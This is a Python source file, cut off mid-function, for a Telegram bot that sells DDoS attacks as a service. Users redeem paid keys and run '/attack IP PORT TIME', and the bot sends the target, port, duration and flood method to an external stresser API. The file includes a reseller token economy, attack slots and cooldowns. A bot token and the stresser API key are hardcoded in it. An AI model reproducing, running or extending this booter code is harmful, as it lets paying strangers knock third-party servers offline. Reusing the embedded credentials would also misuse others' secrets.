#!/usr/bin/env python3
import time
import threading
import json
import os
import requests
import random
import string

TOKEN = "8749555677:AAGH3CzScRKE8mBTLxRapV0zrxdjn-NEul8"
ADMIN_ID = 6548871396
last_id = 0

users = {}
groups = {}
keys = {}
resellers = {}
blocked_keys = {}
is_attack = False
current_target = ""
slot_lock = threading.Lock()
current_slots = 0
MAX_SLOTS = 50
attack_threads = 2000
attack_time = 180
VIDEO_FILE_ID = None
RESELLER_PREFIX = "KING"

cooldown_seconds = 100
user_last_attack = {}
attack_daily_limit = 35
user_attack_count = {}
is_locked = False

server_status = "ACTIVE"
bandwidth = "200 GBPS"
attack_methods = ["UDP", "TCP", "HTTP", "OVH", "STORM", "RAGE", "NFO", "POWER"]

# ============ NEW API ============
API_URL = "https://kimstress.st/api/attack"
API_KEY = "a2ea017c7b4ae5fc2896548aebb9d7353f2980090b971180dea4f30a523dccf1"  # <-- YAHAN APNA API KEY DALO
# =================================

KEY_PRICES = {
    "1h": 0, "12h": 2, "1d": 4, "3d": 8, "7d": 15, "14d": 30, "30d": 50
}

def call_api_attack(ip, port, duration, method="UDP"):
    try:
        payload = {"host": ip, "port": port, "time": duration, "method": method}
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        if API_KEY:
            headers["Authorization"] = f"Bearer {API_KEY}"
        response = requests.post(API_URL, json=payload, headers=headers, timeout=10)
        return response.status_code == 200
    except:
        return False

def run_attack(ip, port, sec, method):
    try:
        call_api_attack(ip, port, sec, method)
        time.sleep(sec)
        return True
    except:
        return False

def send_msg(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        requests.post(url, data=data, timeout=5)
    except:
        pass

def send_video(chat_id, video_id, caption):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendVideo"
        data = {"chat_id": chat_id, "video": video_id, "caption": caption}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def send_inline_buttons(chat_id, text, buttons):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "reply_markup": {"inline_keyboard": buttons}}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def edit_msg(chat_id, msg_id, text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
        data = {"chat_id": chat_id, "message_id": msg_id, "text": text}
        requests.post(url, data=data, timeout=5)
    except:
        pass

def del_msg(chat_id, msg_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
        data = {"chat_id": chat_id, "message_id": msg_id}
        requests.post(url, data=data, timeout=5)
    except:
        pass

def get_slots():
    global current_slots
    with slot_lock:
        return MAX_SLOTS - current_slots

def add_slot():
    global current_slots
    with slot_lock:
        if current_slots < MAX_SLOTS:
            current_slots += 1
    return current_slots

def remove_slot():
    global current_slots
    with slot_lock:
        if current_slots > 0:
            current_slots -= 1
    return current_slots

def save():
    with open('data.json', 'w') as f:
        json.dump({
            'users': users, 'groups': groups, 'video_id': VIDEO_FILE_ID,
            'keys': keys, 'resellers': resellers, 'blocked_keys': blocked_keys,
            'max_slots': MAX_SLOTS, 'cooldown': cooldown_seconds, 'daily_limit': attack_daily_limit
        }, f)

def load():
    global users, groups, VIDEO_FILE_ID, keys, resellers, blocked_keys, MAX_SLOTS, cooldown_seconds, attack_daily_limit
    try:
        with open('data.json', 'r') as f:
            d = json.load(f)
            users.update(d.get('users', {}))
            groups.update(d.get('groups', {}))
            VIDEO_FILE_ID = d.get('video_id', None)
            keys.update(d.get('keys', {}))
            resellers.update(d.get('resellers', {}))
            blocked_keys.update(d.get('blocked_keys', {}))
            MAX_SLOTS = d.get('max_slots', 50)
            cooldown_seconds = d.get('cooldown', 100)
            attack_daily_limit = d.get('daily_limit', 35)
    except:
        pass

def is_user(uid):
    if uid == ADMIN_ID:
        return True
    return str(uid) in users and time.time() < users[str(uid)]

def is_reseller(uid):
    return str(uid) in resellers

def get_user_expiry(uid):
    if str(uid) in users:
        remaining = users[str(uid)] - time.time()
        if remaining <= 0:
            return "Expired"
        days = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        minutes = int((remaining % 3600) // 60)
        
        if days > 0:
            if hours > 0:
                return f"{days}d {hours}h"
            elif minutes > 0:
                return f"{days}d {minutes}m"
            return f"{days}d"
        elif hours > 0:
            if minutes > 0:
                return f"{hours}h {minutes}m"
            return f"{hours}h"
        else:
            return f"{minutes}m"
    return None

def is_group(gid):
    return str(gid) in groups and time.time() < groups[str(gid)]

def add_user(uid, days, hours=0):
    users[str(uid)] = time.time() + (days * 86400) + (hours * 3600)
    save()

def remove_user(uid):
    if str(uid) in users:
        del users[str(uid)]
        save()

def add_group(gid, days):
    groups[str(gid)] = time.time() + days * 86400
    save()

def remove_group(gid):
    if str(gid) in groups:
        del groups[str(gid)]
        save()

def add_reseller(uid, tokens, is_unlimited=False):
    resellers[str(uid)] = {
        'tokens': tokens if not is_unlimited else -1,
        'total_earned': 0,
        'created_at': time.time(),
        'keys_generated': [],
        'blocked_keys': [],
        'unlimited': is_unlimited
    }
    save()

def remove_reseller(uid):
    if str(uid) in resellers:
        del resellers[str(uid)]
        save()

def get_reseller_tokens(uid):
    if str(uid) in resellers:
        if resellers[str(uid)].get('unlimited', False):
            return "∞"
        return resellers[str(uid)].get('tokens', 0)
    return 0

def deduct_reseller_tokens(uid, amount):
    if str(uid) in resellers:
        if resellers[str(uid)].get('unlimited', False):
            return True
        if resellers[str(uid)].get('tokens', 0) >= amount:
            resellers[str(uid)]['tokens'] -= amount
            resellers[str(uid)]['total_earned'] += amount
            save()
            return True
    return False

def add_reseller_key_record(uid, key):
    if str(uid) in resellers:
        if 'keys_generated' not in resellers[str(uid)]:
            resellers[str(uid)]['keys_generated'] = []
        resellers[str(uid)]['keys_generated'].append(key)
        save()

def remove_reseller_key_record(uid, key):
    if str(uid) in resellers and 'keys_generated' in resellers[str(uid)]:
        if key in resellers[str(uid)]['keys_generated']:
            resellers[str(uid)]['keys_generated'].remove(key)
            save()

def get_reseller_keys(uid):
    return resellers[str(uid)]['keys_generated'] if str(uid) in resellers and 'keys_generated' in resellers[str(uid)] else []

def add_blocked_key(uid, key, reason="blocked"):
    if str(uid) in resellers:
        if 'blocked_keys' not in resellers[str(uid)]:
            resellers[str(uid)]['blocked_keys'] = []
        resellers[str(uid)]['blocked_keys'].append(key)
    blocked_keys[key] = {'blocked_by': str(uid), 'reason': reason, 'blocked_at': time.time()}
    if key in keys:
        keys[key]['blocked'] = True
    save()

def remove_blocked_key(key):
    if key in blocked_keys:
        blocker = blocked_keys[key]['blocked_by']
        if blocker in resellers and 'blocked_keys' in resellers[blocker]:
            if key in resellers[blocker]['blocked_keys']:
                resellers[blocker]['blocked_keys'].remove(key)
        del blocked_keys[key]
        if key in keys:
            keys[key]['blocked'] = False
        save()
        return True
    return False

def is_key_blocked(key):
    return key in blocked_keys

def get_reseller_blocked_keys(uid):
    return resellers[str(uid)]['blocked_keys'] if str(uid) in resellers and 'blocked_keys' in resellers[str(uid)] else []

def generate_reseller_key(reseller_id, duration_str):
    days, hours, price = 0, 0, 0
    if duration_str == "1h": hours, price = 1, 0
    elif duration_str == "12h": hours, price = 12, 2
    elif duration_str == "1d": days, price = 1, 4
    elif duration_str == "3d": days, price = 3, 8
    elif duration_str == "7d": days, price = 7, 15
    elif duration_str == "14d": days, price = 14, 30
    elif duration_str == "30d": days, price = 30, 50
    
    if price > 0 and not deduct_reseller_tokens(reseller_id, price):
        return None, f"❌ Insufficient tokens! Need {price} tokens"
    
    key = f"{RESELLER_PREFIX}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'used_at': None, 'created_at': time.time(), 'created_by': str(reseller_id), 'blocked': False}
    add_reseller_key_record(reseller_id, key)
    save()
    return key, None

def generate_admin_key(prefix, days=0, hours=0):
    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'used_at': None, 'created_at': time.time(), 'created_by': "admin", 'blocked': False}
    save()
    return key

def delete_key(key):
    if key in keys:
        creator = keys[key].get('created_by')
        if creator and creator != "admin":
            remove_reseller_key_record(creator, key)
        del keys[key]
        save()
        return True
    return False

def can_attack(uid):
    today = time.strftime("%Y-%m-%d")
    key = f"{uid}_{today}"
    if key not in user_attack_count:
        user_attack_count[key] = 0
    if user_attack_count[key] >= attack_daily_limit:
        return False, f"❌ Daily limit reached! Max {attack_daily_limit} attacks per day"
    
    if uid != ADMIN_ID:
        if uid in user_last_attack:
            last = user_last_attack[uid]
            remaining = cooldown_seconds - (time.time() - last)
            if remaining > 0:
                return False, f"⏳ Cooldown! Wait {int(remaining)}s"
    return True, "OK"

def add_attack_count(uid):
    today = time.strftime("%Y-%m-%d")
    key = f"{uid}_{today}"
    user_attack_count[key] = user_attack_count.get(key, 0) + 1
    user_last_attack[uid] = time.time()
    save()

def redeem_key(user_id, key):
    if key not in keys:
        return False, "❌ Invalid Key!"
    if keys[key]['used']:
        return False, "❌ Key Already Used!"
    if keys[key].get('blocked', False) or is_key_blocked(key):
        return False, "❌ Key is Blocked!"
    
    days, hours = keys[key]['days'], keys[key]['hours']
    keys[key]['used'] = True
    keys[key]['used_by'] = str(user_id)
    keys[key]['used_at'] = time.time()
    users[str(user_id)] = time.time() + (days * 86400) + (hours * 3600)
    save()
    
    if days > 0:
        plan = f"{days} Days"
    else:
        plan = f"{hours} Hours"
    
    return True, f"""
✅ KEY REDEEMED!

Plan: {plan}
Daily Limit: {attack_daily_limit} attacks
Cooldown: {cooldown_seconds}s

Your account is now ACTIVE!
"""

def send_msg_and_get_id(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    r = requests.post(url, data=data, timeout=5)
    try:
        return r.json().get("result", {}).get("message_id")
    except:
        return None

def run_progress(chat_id, msg_id, ip, port, sec, method):
    global is_attack
    for i in range(sec):
        if not is_attack:
            break
        p = int((i+1) / sec * 20)
        bar = "█" * p + "░" * (20 - p)
        percent = int((i+1) / sec * 100)
        try:
            edit_msg(chat_id, msg_id, f"""
⚡ ATTACK IN PROGRESS ⚡
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
📊 [{bar}] {percent}%
⏱️ Left: {sec-(i+1)}s
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
⚙️ METHODS   : {method}
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        except:
            pass
        time.sleep(1)
    
    if is_attack:
        is_attack = False
        remove_slot()
        try:
            del_msg(chat_id, msg_id)
        except:
            pass
        send_msg(chat_id, f"""
✅ ATTACK COMPLETE ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
⏱️ Time: {sec}s
💀 Status: DESTROYED
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
🎮 Free Slots: {get_slots()}/{MAX_SLOTS}
━━━━━━━━━━━━━━━━━━━━━━
""")
        threading.Thread(target=run_attack, args=(ip, port, sec, method)).start()

def handle_video(chat_id, uid, video_id):
    global VIDEO_FILE_ID
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    VIDEO_FILE_ID = video_id
    save()
    send_msg(chat_id, "✅ Attack Video Saved!")

def handle_delvideo(chat_id, uid):
    global VIDEO_FILE_ID
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    VIDEO_FILE_ID = None
    save()
    send_msg(chat_id, "✅ Attack Video Deleted!")

def handle_rules(chat_id):
    used = MAX_SLOTS - get_slots()
    free = get_slots()
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📜 BOT RULES

1. No spamming attacks
2. Play smart
3. No mods
4. Be respectful
5. Report issues
━━━━━━━━━━━━━━━━━━━━━━━━
""")

def handle_lock(chat_id, uid, args):
    global is_locked
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin only!")
        return
    is_locked = True
    send_msg(chat_id, "🔒 Bot Locked!\n\nAll commands are currently disabled by admin.")

def handle_unlock(chat_id, uid, args):
    global is_locked
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin only!")
        return
    is_locked = False
    send_msg(chat_id, "🔓 Bot Unlocked!\n\nAll commands are now available.")

def handle_unlimited(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /unlimited ID")
        return
    try:
        rid = int(args[0])
        if str(rid) in resellers:
            resellers[str(rid)]['unlimited'] = True
            resellers[str(rid)]['tokens'] = -1
            save()
            send_msg(chat_id, f"✅ Reseller {rid} now has UNLIMITED tokens!")
        else:
            send_msg(chat_id, "❌ Reseller not found!")
    except:
        send_msg(chat_id, "❌ Invalid!")

def handle_limited(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /limited ID TOKENS")
        return
    try:
        rid = int(args[0])
        tokens = int(args[1])
        if str(rid) in resellers:
            resellers[str(rid)]['unlimited'] = False
            resellers[str(rid)]['tokens'] = tokens
            save()
            send_msg(chat_id, f"✅ Reseller {rid} now has LIMITED tokens: {tokens}")
        else:
            send_msg(chat_id, "❌ Reseller not found!")
    except:
        send_msg(chat_id, "❌ Invalid!")

def handle_start(chat_id, uid, cid):
    if cid < 0:
        if is_group(cid):
            send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 GROUP COMMANDS!
━━━━━━━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        else:
            send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
❌ GROUP NOT APPROVED!
━━━━━━━━━━━━━━━━━━━━━━━━
Contact: @TG_DEVILOP
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        return
    
    if not is_user(uid) and not is_reseller(uid):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
   ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
❌ ACCESS DENIED!            
You Are Not Approved!          
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 /redeem KEY - Get Access
━━━━━━━━━━━━━━━━━━━━━━━━
Contact: @TG_DEVILOP         
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        return
    
    if uid == ADMIN_ID:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━  
   ⚡ DDOS BOT STARTED ⚡    
━━━━━━━━━━━━━━━━━━━━━━━━
👤 USER COMMANDS:           
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
👑 ADMIN COMMANDS:             
/adduser ID DAYS - Add User
/removeuser ID - Remove User
/addgroup ID DAYS - Add Group
/removegroup ID - Remove Group
/setthreads NUM - Set Threads
/settime SEC - Set Max Time
/setslots NUM - Set Max Slots
/setcooldown SEC - Set Cooldown
/setdaily LIMIT - Set Daily Attack Limit
/delvideo - Delete Attack Video
/gen PREFIX DAYS/HOURS - Generate Key
/keys - List All Keys
/deletekeys - Delete Keys
/addreseller ID TOKENS - Add Reseller
/removereseller ID - Remove Reseller
/resellers - List Resellers
/blockkey KEY - Block Key
/unblockkey KEY - Unblock Key
/lock - Lock Bot (Admin Only)
/unlock - Unlock Bot (Admin Only)
/unlimited ID - Make Reseller Unlimited
/limited ID TOKENS - Make Reseller Limited
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    elif is_reseller(uid):
        tokens = get_reseller_tokens(uid)
        keys_count = len(get_reseller_keys(uid))
        blocked_count = len(get_reseller_blocked_keys(uid))
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
  💼 RESELLER PANEL                  
  🎫 Tokens: {tokens}
  🔑 Keys Generated: {keys_count}
  🚫 Blocked Keys: {blocked_count}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS:                      
⚔️ ATTACK:
/attack IP PORT TIME - Start Attack
/stop - Stop Attack

👤 USER:
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules

🔑 KEY MANAGEMENT:
/genkey - Generate Keys
/deletekey - Delete Your Keys
/blockkey KEY - Block Your Key
/unblockkey KEY - Unblock Your Key
/myblockedkeys - Show Your Blocked Keys
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    else:
        expiry = get_user_expiry(uid)
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ APPROVED USER                  
  📅 Expires: {expiry}          
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS:                      
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
""")

def handle_help(chat_id, uid, cid):
    if cid < 0:
        if is_group(cid):
            send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 HELP - GROUP COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        else:
            send_msg(chat_id, "❌ Group Not Approved!")
        return
    
    if uid == ADMIN_ID:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 HELP - ALL COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
👤 USER COMMANDS:
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
📌 ADMIN COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ ATTACK:
/attack IP PORT TIME - Start Attack
/stop - Stop Attack

👤 USER:
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
/commands - Show All Commands

👥 USER MANAGEMENT:
/adduser ID DAYS - Add User
/removeuser ID - Remove User

👥 GROUP MANAGEMENT:
/addgroup ID DAYS - Add Group
/removegroup ID - Remove Group

⚙️ SETTINGS:
/setthreads NUM - Set Threads
/settime SEC - Set Max Time
/setslots NUM - Set Max Slots
/setcooldown SEC - Set Cooldown
/setdaily LIMIT - Set Daily Attack Limit
/lock - Lock Bot (Admin Only)
/unlock - Unlock Bot (Admin Only)

🔑 KEY MANAGEMENT:
/gen PREFIX DAYS/HOURS - Generate Key
/keys - List All Keys
/deletekeys - Delete Keys
/blockkey KEY - Block Key
/unblockkey KEY - Unblock Key

💼 RESELLER MANAGEMENT:
/addreseller ID TOKENS - Add Reseller
/removereseller ID - Remove Reseller
/resellers - List Resellers
/unlimited ID - Make Reseller Unlimited
/limited ID TOKENS - Make Reseller Limited

🎥 VIDEO:
Send Video - Set Attack Video
/delvideo - Delete Attack Video
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    elif is_reseller(uid):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 RESELLER COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ ATTACK:
/attack IP PORT TIME - Start Attack
/stop - Stop Attack

👤 USER:
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules

🔑 KEY MANAGEMENT:
/genkey - Generate Keys
/deletekey - Delete Your Keys
/blockkey KEY - Block Your Key
/unblockkey KEY - Unblock Your Key
/myblockedkeys - Show Your Blocked Keys
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    else:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 USER COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
""")

def handle_id(chat_id, uid, cid):
    if cid < 0:
        send_msg(chat_id, f"🆔 Group ID: {cid}")
        return
    
    if not is_user(uid) and not is_reseller(uid):
        send_msg(chat_id, "❌ Not Approved! Use /redeem KEY")
        return
    
    if uid == ADMIN_ID:
        send_msg(chat_id, f"🆔 YOUR ID: {uid}\n👑 OWNER")
    elif is_reseller(uid):
        tokens = get_reseller_tokens(uid)
        send_msg(chat_id, f"🆔 YOUR ID: {uid}\n💼 RESELLER\n🎫 Tokens: {tokens}")
    else:
        expiry = get_user_expiry(uid)
        send_msg(chat_id, f"🆔 YOUR ID: {uid}\n✅ Approved\n📅 Expires: {expiry}")

def handle_redeem(chat_id, uid, args):
    if len(args) != 1:
        send_msg(chat_id, "Usage: /redeem KEY")
        return
    success, msg = redeem_key(uid, args[0].upper())
    send_msg(chat_id, msg)

def handle_genkey_reseller(chat_id, uid):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    buttons = [
        [{"text": "🕐 1 Hour - 0 Tokens", "callback_data": "genkey_1h"}],
        [{"text": "🕐 12 Hours - 2 Tokens", "callback_data": "genkey_12h"}],
        [{"text": "📅 1 Day - 4 Tokens", "callback_data": "genkey_1d"}],
        [{"text": "📅 3 Days - 8 Tokens", "callback_data": "genkey_3d"}],
        [{"text": "📅 7 Days - 15 Tokens", "callback_data": "genkey_7d"}],
        [{"text": "📅 14 Days - 30 Tokens", "callback_data": "genkey_14d"}],
        [{"text": "📅 30 Days - 50 Tokens", "callback_data": "genkey_30d"}],
        [{"text": "❌ Cancel", "callback_data": "genkey_cancel"}]
    ]
    send_inline_buttons(chat_id, f"💼 Select Key Type\n\n💰 Balance: {get_reseller_tokens(uid)}", buttons)

def handle_deletekey_reseller(chat_id, uid):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    keys_list = get_reseller_keys(uid)
    if not keys_list:
        send_msg(chat_id, "❌ No keys to delete!")
        return
    buttons = [[{"text": f"🔑 {k}", "callback_data": f"delkey_{k}"}] for k in keys_list[:20]]
    buttons.append([{"text": "❌ Cancel", "callback_data": "delkey_cancel"}])
    send_inline_buttons(chat_id, "🗑️ Select Key To Delete", buttons)

def handle_blockkey_reseller(chat_id, uid, args):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /blockkey KEY")
        return
    key = args[0].upper()
    if key not in keys or keys[key].get('created_by') != str(uid):
        send_msg(chat_id, "❌ You can only block keys you generated!")
        return
    if is_key_blocked(key):
        send_msg(chat_id, "❌ Key already blocked!")
        return
    add_blocked_key(uid, key, "blocked_by_reseller")
    send_msg(chat_id, f"✅ Key {key} blocked!")

def handle_unblockkey_reseller(chat_id, uid, args):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /unblockkey KEY")
        return
    key = args[0].upper()
    if key not in blocked_keys or blocked_keys[key].get('blocked_by') != str(uid):
        send_msg(chat_id, "❌ You can only unblock keys you blocked!")
        return
    remove_blocked_key(key)
    send_msg(chat_id, f"✅ Key {key} unblocked!")

def handle_myblockedkeys(chat_id, uid):
    if not is_reseller(uid):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    blocked = get_reseller_blocked_keys(uid)
    if not blocked:
        send_msg(chat_id, "❌ No blocked keys!")
        return
    send_msg(chat_id, "🚫 YOUR BLOCKED KEYS\n━━━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join([f"🔑 {k}" for k in blocked]))

def handle_blockkey_admin(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /blockkey KEY")
        return
    key = args[0].upper()
    if key not in keys:
        send_msg(chat_id, "❌ Key not found!")
        return
    if is_key_blocked(key):
        send_msg(chat_id, "❌ Key already blocked!")
        return
    creator = keys[key].get('created_by', 'unknown')
    add_blocked_key(creator, key, "blocked_by_admin")
    send_msg(chat_id, f"✅ Key {key} blocked!")

def handle_unblockkey_admin(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /unblockkey KEY")
        return
    key = args[0].upper()
    if key not in blocked_keys:
        send_msg(chat_id, "❌ Key not blocked!")
        return
    remove_blocked_key(key)
    send_msg(chat_id, f"✅ Key {key} unblocked!")

def handle_gen_admin(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /gen PREFIX DURATION")
        return
    prefix, duration = args[0].upper(), args[1].lower()
    days, hours = 0, 0
    if duration.endswith('d'):
        days = int(duration[:-1])
    elif duration.endswith('h'):
        hours = int(duration[:-1])
    else:
        send_msg(chat_id, "❌ Use 'd' or 'h'!")
        return
    key = generate_admin_key(prefix, days, hours)
    send_msg(chat_id, f"✅ Key Generated!\n🔑 {key}\n⏱️ Valid for: {days}d" if days > 0 else f"✅ Key Generated!\n🔑 {key}\n⏱️ Valid for: {hours}h")

def handle_keys(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if not keys:
        send_msg(chat_id, "No keys!")
        return
    unused, used, blocked = [], [], []
    for k, v in keys.items():
        dur = f"{v['days']}d" if v['days'] > 0 else f"{v['hours']}h"
        if v.get('blocked', False) or is_key_blocked(k):
            blocked.append(f"🔑 {k} - {dur} - BLOCKED")
        elif v['used']:
            used.append(f"🔑 {k} - {dur} - Used by {v['used_by']}")
        else:
            unused.append(f"🔑 {k} - {dur} - Available")
    msg = "📋 KEYS LIST\n\n"
    if unused:
        msg += "✅ UNUSED:\n" + "\n".join(unused[:15]) + "\n\n"
    if used:
        msg += "❌ USED:\n" + "\n".join(used[:15]) + "\n\n"
    if blocked:
        msg += "🚫 BLOCKED:\n" + "\n".join(blocked[:15])
    send_msg(chat_id, msg[:4000])

def handle_deletekeys_admin(chat_id, uid):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    buttons = [
        [{"text": "🗑️ Delete All Unused Keys", "callback_data": "admin_del_unused"}],
        [{"text": "🗑️ Delete All Used Keys", "callback_data": "admin_del_used"}],
        [{"text": "🗑️ Delete All Keys", "callback_data": "admin_del_all"}],
        [{"text": "❌ Cancel", "callback_data": "admin_del_cancel"}]
    ]
    send_inline_buttons(chat_id, "🗑️ ADMIN - Delete Keys", buttons)

def handle_setthreads(chat_id, uid, args):
    global attack_threads
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setthreads NUM")
        return
    attack_threads = int(args[0])
    send_msg(chat_id, f"✅ Threads set to {attack_threads}")

def handle_settime(chat_id, uid, args):
    global attack_time
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /settime SEC")
        return
    attack_time = int(args[0])
    if attack_time < 1:
        attack_time = 1
    if attack_time > 600:
        attack_time = 600
    save()
    send_msg(chat_id, f"✅ Max time set to {attack_time}s")

def handle_setslots(chat_id, uid, args):
    global MAX_SLOTS
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setslots NUM")
        return
    MAX_SLOTS = int(args[0])
    if MAX_SLOTS < 1:
        MAX_SLOTS = 1
    if MAX_SLOTS > 200:
        MAX_SLOTS = 200
    save()
    send_msg(chat_id, f"✅ Max slots set to {MAX_SLOTS}")

def handle_setcooldown(chat_id, uid, args):
    global cooldown_seconds
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setcooldown SECONDS")
        return
    cooldown_seconds = int(args[0])
    if cooldown_seconds < 0:
        cooldown_seconds = 0
    if cooldown_seconds > 600:
        cooldown_seconds = 600
    save()
    send_msg(chat_id, f"✅ Cooldown set to {cooldown_seconds}s")

def handle_setdaily(chat_id, uid, args):
    global attack_daily_limit
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setdaily LIMIT")
        return
    attack_daily_limit = int(args[0])
    if attack_daily_limit < 1:
        attack_daily_limit = 1
    if attack_daily_limit > 1000:
        attack_daily_limit = 1000
    save()
    send_msg(chat_id, f"✅ Daily limit set to {attack_daily_limit}")

def handle_adduser(chat_id, uid, args):
    if uid != ADMIN_ID:
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /adduser ID DAYS")
        return
    add_user(int(args[0]), int(args[1]), 0)
    send_msg(chat_id, f"✅ User {args[0]} added for {args[1]} days!")

def handle_removeuser(chat_id, uid, args):
    if uid != ADMIN_ID:
